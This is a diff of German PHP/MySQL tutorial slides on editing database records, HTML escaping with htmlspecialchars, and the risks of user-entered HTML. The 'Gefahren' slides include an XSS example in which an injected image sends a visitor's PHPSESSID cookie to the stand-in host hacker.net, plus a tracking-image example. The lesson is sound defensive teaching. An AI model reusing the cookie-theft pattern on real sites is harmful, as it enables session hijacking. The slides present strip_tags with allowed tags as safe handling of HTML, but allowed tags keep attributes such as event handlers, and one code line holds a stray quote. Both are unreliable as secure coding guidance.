@@ -39,39 +39,49 @@
           <div class="slide"><h1>Daten Bearbeiten</h1>
           <p><a href="/php-mysql-2/daten-editieren/">zurück zum Buch-Kapitel</a></p>
           </div>
-	  <div class='slide'><p>Wir wollen einen Datensatz aus der Datenbank laden, in einem Formular zur Bearbeitung anbieten, und dann wieder in der Datenbank speichern.</p>
+	  <div class='slide'><p>Wir wollen einen Datensatz aus der Datenbank laden, in einem Formular zur
+Bearbeitung anbieten, und dann wieder in der Datenbank speichern.</p>
 
 <p><img src="/images/person_edit.png" alt="Abbildung 150: Formular zum Bearbeiten einer Person" /></p>
 
-<p>Das Lesen des Datensatzes aus der Datenbank erfolgt nun auch mit einem prepared Statement:</p>
+<p>Das Lesen des Datensatzes aus der Datenbank erfolgt nun auch mit einem prepared Statement,
+da die ID aus dem GET-Parameter gelesen wurde:</p>
 
 <div class="example">
 <h4 class="caption">Php Code <small>laden des Datensatzes, der editiert werden soll</small></h4>
 <pre class="lang-php prettyprint linenums">
 $sth = $dbh-&gt;prepare( &quot;SELECT * FROM users WHERE id=?&quot; );
 $sth-&gt;execute( array( $id ) );
-$sth-&gt;setFetchMode(PDO::FETCH_OBJ);
 $person = $sth-&gt;fetch();
 </pre></div>
 
-<p>Bei der Darstellung des Bearbeitungs-Formulars werden die Daten nun als Standardwerte dargestellt. Das passiert bei Textfeldern mit dem Value-Attribute und bei Textareas als Inhalt des Tags:</p>
+</div>
+<div class='slide'>
+
+<h3 id="das-bearbeitungs-formular">Das Bearbeitungs-Formular</h3>
+
+<p>Bei der Darstellung des Bearbeitungs-Formulars werden die Daten nun als
+Standardwerte dargestellt. Das passiert bei Textfeldern mit dem Value-Attribute
+und bei Textareas als Inhalt des Tags:</p>
 
 <div class="example">
 <pre class="lang-html prettyprint linenums">
-  &lt;input name=&quot;firstname&quot; value=&quot;Tobias&quot;&gt;
-  &lt;textarea name=&quot;description&quot; rows=&quot;7&quot;&gt;Webdesigner und Programmierer.&lt;/textarea&gt;
+&lt;input name=&quot;firstname&quot; value=&quot;Tobias&quot;&gt;
+&lt;textarea name=&quot;description&quot; rows=&quot;7&quot;&gt;Webdesigner&lt;/textarea&gt;
 </pre></div>
 
-<p>Achtung: Falls in den Daten Anführungszeichen, kaufmännische Unds oder Kleiner-Zeichen vorkommen müssen diese für HTML escaped werden.  Hier ein Beispiel in MySQL:</p>
+<p>Achtung: Falls in den Daten Anführungszeichen, kaufmännische Unds oder
+Kleiner-Zeichen vorkommen müssen diese für HTML escaped werden.  Hier ein
+Beispiel in MySQL:</p>
 
 <div class="example">
 <pre class="lang-sql prettyprint linenums">
-mysql&gt; select firstname,description from users where id=438;
-+-----------+--------------------------------+
-| firstname | description                    |
-+-----------+--------------------------------+
-| Tobias    | Mein Lieblings-Tag ist &lt;style&gt; | 
-+-----------+--------------------------------+
+MariaDB [portfolio_playground]&gt; select firstname,description from users where id=438;
++--------------------+--------------------------------+
+| firstname          | description                    |
++--------------------+--------------------------------+
+| Tobias &quot;der Coder&quot; | Mein Lieblings-Tag ist &lt;style&gt; |
++--------------------+--------------------------------+
 1 row in set (0.00 sec)
 </pre></div>
 
@@ -79,33 +89,52 @@ mysql&gt; select firstname,description from users where id=438;
 
 <div class="example">
 <pre class="lang-html prettyprint linenums">
-  &lt;input name=&quot;firstname&quot; value=&quot;Tobias &quot;the coder&quot; &quot; /&gt;
-  &lt;textarea name=&quot;description&quot; rows=&quot;7&quot;&gt;Mein Lieblings-Tag: &lt;style&gt;&lt;/textarea&gt;
+&lt;input name=&quot;firstname&quot; value=&quot;Tobias &quot;the Coder&quot;&quot;&gt;
+&lt;textarea name=&quot;description&quot; rows=&quot;7&quot;&gt;Mein Lieblings-Tag ist &lt;style&gt;&lt;/textarea&gt;
 </pre></div>
 
-<p>Richtig ist die Darstellung gewisser Zeichen als HTML entities:</p>
+<p>Das Attribut <code>value</code> endet zu früh, und der <code>&lt;style&gt;</code> Tag lässt
+den Rest der Webseite verschwinden.</p>
+
+</div>
+<div class='slide'>
+
+
+
+<p>Richtig ist die Darstellung gewisser Zeichen als HTML Entities:</p>
 
 <div class="example">
 <pre class="lang-html prettyprint linenums">
-  &lt;input name=&quot;firstname&quot; value=&quot;Tobias &amp;quot;the coder&amp;quot; &quot; /&gt;
-  &lt;textarea name=&quot;description&quot; rows=&quot;7&quot;&gt;Mein Lieblings-Tag: &amp;lt;style&amp;gt;&lt;/textarea&gt;
+&lt;input name=&quot;firstname&quot; value=&quot;Tobias &amp;quot;the coder&amp;quot;&quot;&gt;
+&lt;textarea name=&quot;description&quot; rows=&quot;7&quot;&gt;Mein Lieblings-Tag ist &amp;lt;style&amp;gt;&lt;/textarea&gt;
 </pre></div>
 
-<p>Diese Ersetzung wird mit der Funktion htmlspecialchars vorgenommen:</p>
+<p>Diese Ersetzung wird mit der Funktion
+<code>htmlspecialchars</code><a href="http://www.php.net/manual/en/function.htmlspecialchars.php">→</a> vorgenommen:</p>
 
 <div class="example">
 <pre class="lang-php prettyprint linenums">
-htmlspecialchars( $person-&gt;firstname  );
+htmlspecialchars( $person-&gt;firstname );
 </pre></div>
+
+</div>
+<div class='slide'>
+
+
 
 <p>Zusammenfassend sieht die Darstellung des Eingabeformulars so aus:</p>
 
 <div class="example">
 <h4 class="caption">Php Code <small>Darstellung eines Eingabe-Felds des Edit-Formulars mit PHP</small></h4>
 <pre class="lang-php prettyprint linenums">
-&lt;p&gt;&lt;label for=&quot;firstname&quot;&gt;Vorname&lt;/label&gt; 
-&lt;input name=&quot;firstname&quot; value=&quot;&lt;?= htmlspecialchars( $person-&gt;firstname ) ?&gt;&quot;&gt;&lt;/p&gt;
+&lt;input name=&quot;firstname&quot; value=&quot;&lt;?php echo htmlspecialchars( $person-&gt;firstname ) ?&gt;&quot;&gt;
+&lt;textarea name=&quot;description&quot; rows=&quot;7&quot;&gt;&lt;?php echo htmlspecialchars( $person-&gt;description ) ?&gt;&lt;/textarea&gt;
 </pre></div>
+
+</div>
+<div class='slide'>
+
+<h3 id="verarbeitung-des-post-request">Verarbeitung des POST-Request</h3>
 
 <p>Die veränderten Daten werden mit POST an person_edit.php geschickt. Aus den Daten wird ein UPDATE-Statement erstellt:</p>
 
@@ -114,23 +143,22 @@ htmlspecialchars( $person-&gt;firstname  );
 <pre class="lang-php prettyprint linenums">
 $sth = $dbh-&gt;prepare(
   &quot;UPDATE users SET
-    firstname=?,surname=?,email=?,profile_visible=?,
-    updated_at=NOW(),description=?,slug=?
+    firstname=?,surname=?,email=?,
+    profile_visible=?,description=? 
    WHERE id=?&quot;);
 
 $update_went_ok = $sth-&gt;execute(
-        array(
-          $_POST['firstname'],
-          $_POST['surname'],
-          $_POST['email'],
-          $_POST['profile_visible'],
-          $_POST['description'],
-          $_POST['slug'],
-          $_POST['id'],
-        )
+  array(
+    $_POST['firstname'],
+    $_POST['surname'],
+    $_POST['email'],
+    $_POST['profile_visible'],
+    $_POST['description'],
+    $_POST['id']
+  )
 );
 
-header(&quot;Location: person.php?pid=&quot; . $_POST['id']);
+header(&quot;Location: person.php?id=&quot; . $_POST['id']);
 exit;
 </pre></div>
 
@@ -143,11 +171,16 @@ exit;
 <div class="example">
 <h4 class="caption">Php Code <small>Ausgabe von Daten aus der Datenbank ohne html-escaping</small></h4>
 <pre class="lang-php prettyprint linenums">
-&lt;?= $person-&gt;firstname ?&gt;
-&lt;?= $person-&gt;surname ?&gt;
-hat insgesamt  &lt;?= $no ?&gt; Werke in dieser Datenbank.
+&lt;?php echo $person-&gt;firstname ?&gt;
+&lt;?php echo $person-&gt;surname ?&gt;
+hat insgesamt  &lt;?php echo $no ?&gt; Werke in dieser Datenbank.
 // problematisch!
 </pre></div>
+
+</div>
+<div class='slide'>
+
+
 
 <p>Wenn hier in der Description „Mein Lieblings-Tag ist &lt;style&gt;“ steht, und dieser Text einfach ausgegeben wird, dann „verschwindet“ der Rest der Webseite, weil er sich nun innerhalb eines Style-Tags befindet.</p>
 
@@ -160,37 +193,57 @@ $surname     = htmlspecialchars( $person-&gt;surname      );
 $description = htmlspecialchars( $person-&gt;description' );
 
 echo &lt;&lt;&lt;EOM
-    &lt;p&gt;$anrede $vorname $nachname hat insgesamt $no Werke in dieser Datenbank.
-    $ersie hat den Usernamen $username.&lt;/p&gt;
+  &lt;p&gt;$anrede $vorname $nachname hat insgesamt 
+  $no Werke in dieser Datenbank.
+  $ersie hat den Usernamen $username.&lt;/p&gt;
 
-    &lt;div&gt;$description&lt;/div&gt;
+  &lt;div&gt;$description&lt;/div&gt;
 EOM;
 </pre></div>
 
 <p>Damit funktioniert nun die Darstellung des Datensatzes richtig:</p>
 
-<p><img src="/images/image369.png" alt="Abbildung 151: Korrekte Darstellung eines Datensatzes mit kleiner-Zeichen" /></p>
+<p><img src="/images/image369.png" alt="Korrekte Darstellung eines Datensatzes mit kleiner-Zeichen" /></p>
 
 </div>
 <div class='slide'>
 
 <h2 id="darstellen-von-html">Darstellen von HTML</h2>
-<p>Im letzten Beispielen wurde der eingegebene HTML-Tag sichtbar auf der Webseite angezeigt. Wie kann man HTML-Tags eingeben, abspeichern, und als HTML-Tags wieder anzeigen?</p>
+<p>Im letzten Beispielen wurde der eingegebene HTML-Tag sichtbar auf der Webseite
+angezeigt. Wie kann man HTML-Tags eingeben, abspeichern, und als HTML-Tags
+wieder anzeigen?</p>
 
 </div>
 <div class='slide'>
 
 <h3 id="gefahren">Gefahren</h3>
-<p>Zuerst eine Warnung: Die Anzeige von HTML das von Fremden eingegeben wurde ist gefährlich! Dazu zwei Beispiele: Sie bauen ein Gästebuch in dem BesucherInnen beliebiges HTML abspeichern können. Herr Lauscher trägt dort ein Bild ein:</p>
+<p>Zuerst eine Warnung: Die Anzeige von HTML das von Fremden eingegeben wurde ist
+gefährlich! Dazu zwei Beispiele: Sie bauen ein Gästebuch in dem BesucherInnen
+beliebiges HTML abspeichern können. Herr Lauscher trägt dort ein Bild ein:</p>
 
 <div class="example">
 <pre class="lang-html prettyprint linenums">
 &lt;img src=&quot;http://lauscher.net/bild.php?woher=gaestebuch_mmt&quot; alt=&quot;harmloses bild&quot;&gt;
 </pre></div>
 
-<p>Das Bild wird also nicht von Ihrem Webserver geladen, sondern vom Webserver von Herrn Lauscher. Und dort wird gleich ein php-Programm zum Erzeugen des Bildes aufgerufen. D.h. Herr Lauscher kann sehr bequem mit-loggen wie viele Zugriffe auf das Gästebuch erfolgen. Falls Herr Lauscher die Gästebuch-Besucher schon kennt (schon ein Cookie in Ihrem Browser gesetzt hat) kann er sie auch identifizieren.</p>
+<p>Das Bild wird also nicht von Ihrem Webserver geladen, sondern vom Webserver von
+Herrn Lauscher. Und dort wird gleich ein php-Programm zum Erzeugen des Bildes
+aufgerufen. D.h. Herr Lauscher kann sehr bequem mit-loggen wie viele Zugriffe
+auf das Gästebuch erfolgen. Falls Herr Lauscher die Gästebuch-Besucher schon
+kennt (schon ein Cookie in Ihrem Browser gesetzt hat) kann er sie auch
+identifizieren.</p>
 
-<p>Sie haben Herrn Lauscher also die Möglichkeit gegeben sehr viel über Ihre BesucherInne zu erfahren. So etwas ähnliches passiert z.B. wenn Sie Google Analytics in Ihre Webseite einbinden um Zugriffs-Statistiken zu erstellen: Google erfährt von jedem Zugriff auf Ihre Seite, Google kennt viele BesucherInnen schon (weil Sie bei gmail.com eingeloggt sind oder von einer vorhergehenden Suche noch ein Cookie haben.)</p>
+<p>Sie haben Herrn Lauscher also die Möglichkeit gegeben sehr viel über Ihre
+BesucherInne zu erfahren. So etwas ähnliches passiert z.B. wenn Sie Google
+Analytics in Ihre Webseite einbinden um Zugriffs-Statistiken zu erstellen:
+Google erfährt von jedem Zugriff auf Ihre Seite, Google kennt viele
+BesucherInnen schon (weil Sie bei gmail.com eingeloggt sind oder von einer
+vorhergehenden Suche noch ein Cookie haben.)</p>
+
+</div>
+<div class='slide'>
+
+
 
 <p>Im zweiten Beispiel gibt Frau Hacker neben einem Bild noch etwas Javascript ein:</p>
 
@@ -212,36 +265,71 @@ Hallo Welt
 src=&quot;http://hacker.net/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb076115&quot;/&gt;
 </pre></div>
 
-<p>So kann Frau Hacker das Cookie einer BesucherIn Ihres Gästebuchs entwenden. Sie kann nun das Cookie verwenden um als eingeloggter User Ihre Seite zu benützen!</p>
+<p>So kann Frau Hacker das Cookie einer BesucherIn Ihres Gästebuchs entwenden. Sie
+kann nun das Cookie verwenden um als eingeloggter User Ihre Seite zu benützen!</p>
 
 <p>Lassen Sie niemals, niemals, niemals zu, dass Fremde Javascript in Ihre Site einspeisen können!</p>
-
-<p>Noch hat unsere Applikation dieses Problem nicht: Wenn Frau Hacker Ihren Code z.B. in das Profil einer Person eingibt wir der Code htmlescaped angezeigt und „wirkt nicht“:</p>
-
-<p><img src="/images/image370.png" alt="Abbildung 152: Eingegebener HTML+Javascript-Code wird escaped und dargestellt" /></p>
 
 </div>
 <div class='slide'>
 
-<h3 id="sichere-eingabe-von-html">Sichere Eingabe von HTML</h3>
 
-<p>Für die Beispiel-Applikation wollen wir Zulassen, dass im Profil die HTML-Tags &lt;p&gt; und &lt;b&gt; verwendet werden können, mehr nicht. Dass es nur diese Tags und keine anderen sind wird bei der Eingabe und der Bearbeitung sicher gestellt:</p>
+
+<p>Noch hat unsere Applikation dieses Problem nicht: Wenn Frau Hacker Ihren Code
+z.B. in das Profil einer Person eingibt wir der Code htmlescaped angezeigt und
+„wirkt nicht“:</p>
+
+<p><img src="/images/image370.png" alt="Eingegebener HTML+Javascript-Code wird escaped und dargestellt" /></p>
+
+</div>
+<div class='slide'>
+
+<h3 id="eingabe-von-html">Eingabe von HTML</h3>
+
+<p>Die Eingabe des HTML-Codes können Sie mit einem Javascript-Editor wie TinyMCE
+erleichtern. TinyMCE verwandelt eine normale Textarea in einen wysiwyg-Editor:</p>
+
+<p><img src="/images/image371.png" alt="Normale Textarea (oben) kann mit TinyMCE in einen wysiwyg-Editor (unten) verwandelt werden" /></p>
+
+<p>Mit HTML5 gibt es auch die Möglichkeit ohne Textfeld, mit content-editable einen
+Editor zu erstellen. Ein Beispiel dafür ist der Aloha Editor:</p>
+
+<p><img src="/images/aloha.png" alt="Aloha Editor" /></p>
+
+</div>
+<div class='slide'>
+
+<h3 id="behandlugn-von-eingegebenem-html">Behandlugn von eingegebenem HTML</h3>
+
+<p>Für die Beispiel-Applikation wollen wir Zulassen, dass im Profil die HTML-Tags
+<code>&lt;p&gt;</code> und <code>&lt;b&gt;</code> verwendet werden können, mehr nicht. Dass es nur diese
+Tags und keine anderen sind wird bei der Eingabe und der Bearbeitung sicher
+gestellt:</p>
 
 <div class="example">
 <pre class="lang-php prettyprint linenums">
 $description = strip_tags( $_POST['description'], &quot;&lt;p&gt;&lt;b&gt;&quot; );
 </pre></div>
 
-<p>Nun können Sie auch die Ausgabe des Profils umstellen und auf das escapen verzichten:</p>
+<p>Nun können Sie auch die Ausgabe des Profils umstellen und auf das escapen 
+der <code>description</code> verzichten:</p>
 
-<p>Die Eingabe des HTML-Codes können Sie mit einem Javascript-Editor wie TinyMCE erleichtern. TinyMCE verwandelt eine normale Textarea in einen wysiwyg-Editor:</p>
+<div class="example">
+<h4 class="caption">Php Code <small>Ausgabe von Daten aus der Datenbank mit html-escaping</small></h4>
+<pre class="lang-php prettyprint linenums">
+$username    = htmlspecialchars( $person-&gt;username     );
+$firstname   = htmlspecialchars( $person-&gt;firstname    );
+$surname     = htmlspecialchars( $person-&gt;surname      );
+$description = strip_tags( $person-&gt;description,  &quot;&lt;p&gt;&lt;b&gt;&quot; );
 
-<p><img src="/images/image371.png" alt="Abbildung 153: Normale Textarea (oben) kann mit TinyMCE in einen wysiwyg-Editor (unten) verwandelt werden" /></p>
+echo &lt;&lt;&lt;EOM
+  &lt;p&gt;$anrede $vorname $nachname hat insgesamt 
+  $no Werke in dieser Datenbank.
+  $ersie hat den Usernamen $username.&lt;/p&gt;
 
-<p>Mit HTML5 gibt es auch die möglichkeit ohen Textfeld, mit content-editable einen Editor zu erstellen. Ein
-Beispiel dafür ist der Aloha Editor:</p>
-
-<p><img src="/images/aloha.png" alt="Abbildung 153b: Aloha Editor" /></p>
+  &lt;div&gt;$description&lt;/div&gt;
+EOM;
+</pre></div>
 </div>
           <div class="slide"><h1>Ende</h1>
           <p><a href="/php-mysql-2/daten-editieren/">zurück zum Buch-Kapitel</a></p>
